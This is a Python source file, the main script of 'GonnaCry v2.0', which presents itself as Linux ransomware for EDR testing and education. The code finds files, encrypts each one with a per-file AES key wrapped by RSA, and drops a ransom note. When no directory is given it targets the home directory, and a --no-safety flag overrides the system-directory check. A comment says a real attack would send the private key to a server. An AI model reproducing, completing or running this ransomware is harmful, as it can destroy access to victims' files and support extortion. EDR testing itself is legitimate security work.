#!/usr/bin/env python3
"""
GonnaCry v2.0 - Modernized Linux Ransomware for EDR Testing
Educational security research tool

Usage:
    python3 main.py [--test] [--directory PATH] [--decrypt]

Environment Variables:
    GONNACRY_TEST_MODE=true     - Enable test mode (safe)
    GONNACRY_TEST_DIR=path      - Directory for test files
    GONNACRY_SAFE_MODE=false    - Disable safety checks (DANGEROUS)
    GONNACRY_LOG_LEVEL=DEBUG    - Set logging level
"""

import sys
import os
import argparse
import logging
from pathlib import Path
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from GonnaCry.config.settings import (
    TEST_MODE, 
    TEST_DIRECTORY, 
    SAFE_MODE,
    LOG_LEVEL,
    LOG_FILE,
    IOC_MARKERS
)
from GonnaCry.core.crypto import AESCipher, RSAKeyPair, generate_file_key, encrypt_file_key
from GonnaCry.utils.file_ops import (
    find_files, 
    encrypt_file, 
    decrypt_file,
    create_ransom_note,
    get_test_files,
    is_safe_directory
)


def setup_logging():
    """Configure logging"""
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter(log_format))
    
    # File handler
    file_handler = logging.FileHandler(LOG_FILE)
    file_handler.setFormatter(logging.Formatter(log_format))
    
    # Configure root logger
    logging.basicConfig(
        level=getattr(logging, LOG_LEVEL.upper()),
        handlers=[console_handler, file_handler]
    )
    
    return logging.getLogger('GonnaCry')


def print_banner():
    """Print GonnaCry banner"""
    banner = """
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║              G O N N A C R Y   v 2 . 0                ║
║                                                       ║
║     Modernized Ransomware for EDR Security Testing    ║
║                                                       ║
║     ⚠️  EDUCATIONAL PURPOSES ONLY - USE RESPONSIBLY   ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
"""
    print(banner)


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='GonnaCry v2.0 - EDR Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test mode (safe - only encrypts test directory)
  python3 main.py --test
  
  # Encrypt specific directory (with safety checks)
  python3 main.py --directory /home/user/documents
  
  # Decrypt files
  python3 main.py --decrypt --directory /home/user/documents
  
Environment Variables:
  GONNACRY_TEST_MODE=true    Enable test mode
  GONNACRY_SAFE_MODE=false   Disable safety checks (DANGEROUS)
        """
    )
    
    parser.add_argument(
        '--test', 
        action='store_true',
        help='Enable test mode (only encrypts test directory)'
    )
    
    parser.add_argument(
        '--directory', '-d',
        type=str,
        help='Directory to encrypt/decrypt'
    )
    
    parser.add_argument(
        '--decrypt',
        action='store_true',
        help='Decrypt files instead of encrypting'
    )
    
    parser.add_argument(
        '--no-safety',
        action='store_true',
        help='Disable safety checks (DANGEROUS - use with caution)'
    )
    
    parser.add_argument(
        '--recursive', '-r',
        action='store_true',
        default=True,
        help='Recursively process directories (default: True)'
    )
    
    return parser.parse_args()


def run_encryption(directory, logger):
    """Run encryption process on directory"""
    logger.info(f"Starting encryption of {directory}")
    
    # Find files to encrypt
    files = find_files(directory)
    
    if not files:
        logger.warning("No encryptable files found")
        return False
    
    logger.info(f"Found {len(files)} files to encrypt")
    
    # Generate RSA key pair for this session
    rsa_keys = RSAKeyPair()
    logger.info("Generated RSA-2048 key pair")
    
    encrypted_files = []
    encryption_data = []  # Store (filepath, aes_key) for later
    
    # Encrypt each file
    for filepath in files:
        try:
            # Generate unique AES key for this file
            aes_key = generate_file_key()
            aes_cipher = AESCipher(aes_key)
            
            # Encrypt file
            result = encrypt_file(filepath, aes_cipher)
            
            if result:
                encrypted_path, _ = result
                encrypted_files.append(encrypted_path)
                
                # Encrypt AES key with RSA public key
                encrypted_aes_key = encrypt_file_key(
                    aes_key, 
                    rsa_keys.get_public_key_pem()
                )
                
                encryption_data.append({
                    'original': str(filepath),
                    'encrypted': encrypted_path,
                    'encrypted_key': encrypted_aes_key,
                })
                
                logger.debug(f"Encrypted: {filepath} -> {encrypted_path}")
        
        except Exception as e:
            logger.error(f"Failed to encrypt {filepath}: {e}")
            continue
    
    # Save encryption metadata (in real scenario, send to server)
    metadata_file = Path(directory) / f".encryption_metadata_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
    try:
        import pickle
        with open(metadata_file, 'wb') as f:
            pickle.dump({
                'files': encryption_data,
                'private_key': rsa_keys.get_private_key_pem(),
                'timestamp': datetime.now().isoformat(),
            }, f)
        logger.info(f"Saved encryption metadata to {metadata_file}")
    except Exception as e:
        logger.error(f"Failed to save metadata: {e}")
    
    # Create ransom note
    create_ransom_note(directory)
    logger.info("Created ransom note")
    
    logger.info(f"Encryption complete: {len(encrypted_files)} files encrypted")
    return True


def run_decryption(directory, metadata_file, logger):
    """Run decryption process"""
    logger.info(f"Starting decryption of {directory}")
    
    import pickle
    
    # Load metadata
    try:
        with open(metadata_file, 'rb') as f:
            metadata = pickle.load(f)
    except Exception as e:
        logger.error(f"Failed to load metadata: {e}")
        return False
    
    private_key_pem = metadata['private_key']
    
    decrypted_count = 0
    for file_data in metadata['files']:
        try:
            from GonnaCry.core.crypto import decrypt_file_key, AESCipher
            
            # Decrypt AES key
            aes_key = decrypt_file_key(
                file_data['encrypted_key'],
                private_key_pem
            )
            
            # Decrypt file
            decrypted_path = decrypt_file(
                file_data['encrypted'],
                aes_key,
                file_data['original']
            )
            
            if decrypted_path:
                decrypted_count += 1
                logger.debug(f"Decrypted: {file_data['encrypted']} -> {decrypted_path}")
        
        except Exception as e:
            logger.error(f"Failed to decrypt {file_data['encrypted']}: {e}")
            continue
    
    logger.info(f"Decryption complete: {decrypted_count} files decrypted")
    return True


def main():
    """Main entry point"""
    print_banner()
    
    # Parse arguments
    args = parse_arguments()
    
    # Setup logging
    logger = setup_logging()
    logger.info("GonnaCry v2.0 starting")
    
    # Safety check
    if args.no_safety:
        logger.warning("Safety checks disabled!")
        global SAFE_MODE
        SAFE_MODE = False
    
    # Determine target directory
    if args.test or TEST_MODE:
        target_dir = Path(TEST_DIRECTORY)
        logger.info(f"Test mode: using directory {target_dir}")
        
        # Create test directory if it doesn't exist
        target_dir.mkdir(parents=True, exist_ok=True)
        
        # Create some test files if empty
        if not any(target_dir.iterdir()):
            logger.info("Creating test files...")
            for i in range(5):
                test_file = target_dir / f"test_document_{i}.txt"
                test_file.write_text(f"This is test file {i} for EDR testing.\n" * 10)
    elif args.directory:
        target_dir = Path(args.directory)
    else:
        target_dir = Path.home()
        logger.warning(f"No directory specified, using home: {target_dir}")
    
    # Validate directory
    if not target_dir.exists():
        logger.error(f"Directory does not exist: {target_dir}")
        sys.exit(1)
    
    if not is_safe_directory(target_dir) and not args.no_safety:
        logger.error(f"Cannot encrypt system directory: {target_dir}")
        logger.error("Use --no-safety to override (DANGEROUS)")
        sys.exit(1)
    
    # Run encryption or decryption
    if args.decrypt:
        # Look for metadata file
        metadata_files = list(target_dir.glob(".encryption_metadata_*.dat"))
        if not metadata_files:
            logger.error("No encryption metadata found")
            sys.exit(1)
        
        success = run_decryption(target_dir, metadata_files[-1], logger)
    else:
        success = run_encryption(target_dir, logger)
    
    logger.info("GonnaCry finished")
    return 0 if success else 1


if __name__ == '__main__':
    sys.exit(main())
